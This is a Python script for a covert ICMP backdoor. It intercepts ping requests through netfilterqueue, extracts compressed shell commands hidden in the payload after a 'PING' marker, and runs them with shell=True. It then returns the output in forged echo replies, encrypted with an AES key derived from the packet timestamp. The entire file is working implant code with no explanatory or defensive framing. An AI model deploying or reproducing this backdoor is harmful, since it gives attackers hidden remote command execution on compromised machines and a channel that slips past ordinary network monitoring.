from netfilterqueue import NetfilterQueue
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import AES

from binascii import hexlify
from subprocess import PIPE, Popen
from scapy.all import *

import re
import os
import zlib
import struct
import random

ping_exec = re.compile(r'.{4}PING(.*).{4}', re.S)


class EchoData(object):
    def __init__(self, data):
        self.data = zlib.compress(data)

    def tobytes(self):
        return self.length + self.type + self.data + self.checksum

    @property
    def type(self):
        return 'PONG'

    @property
    def length(self):
        return pack(len(self.data))

    @property
    def checksum(self):
        return chsum(self.data)


def pack(num):
    return struct.pack('!I', num)

def chsum(data):
    checksum = zlib.crc32(data) % (1<<32)
    return struct.pack('>I', checksum)

def randstr(seed, size=32):
    random.seed(seed)
    
    return bytearray(random.getrandbits(8) for _ in xrange(size))

def encrypt(text, seed=None):
    iv = os.urandom(16)
    key = randstr(seed)
    enc = AES.new(key, AES.MODE_CBC, iv)
    data = pad(hexlify(text), 16)

    return iv + enc.encrypt(data)

def run_shell(command):
    p = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
    stdout, stderr = p.communicate()

    return stdout if stdout else stderr

def mod(pkt):
    time = int(pkt[IP].time)
    src = pkt[IP].src
    dst = pkt[IP].dst

    id = pkt[ICMP].id
    seq = pkt[ICMP].seq
    data = pkt[ICMP].load

    try:
        data = ping_exec.findall(data)[0]
        data = zlib.decompress(data)

        response = run_shell(data)
        response = EchoData(encrypt(response, time)).tobytes()
    except :
        response = 'Something went wrong?'

    send(IP(src=dst, dst=src)/ICMP(type=0, code=0, id=id, seq=seq)/response)

def icmp_hooks(pkt):
    packet = IP(pkt.get_payload())
    proto = packet.proto
    
    if proto == 0x01:
        if packet[ICMP].type == 8:
            mod(packet)

if __name__ == '__main__':
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, icmp_hooks)

    try:
        nfqueue.run()
    except KeyboardInterrupt:
        pass

    nfqueue.unbind()
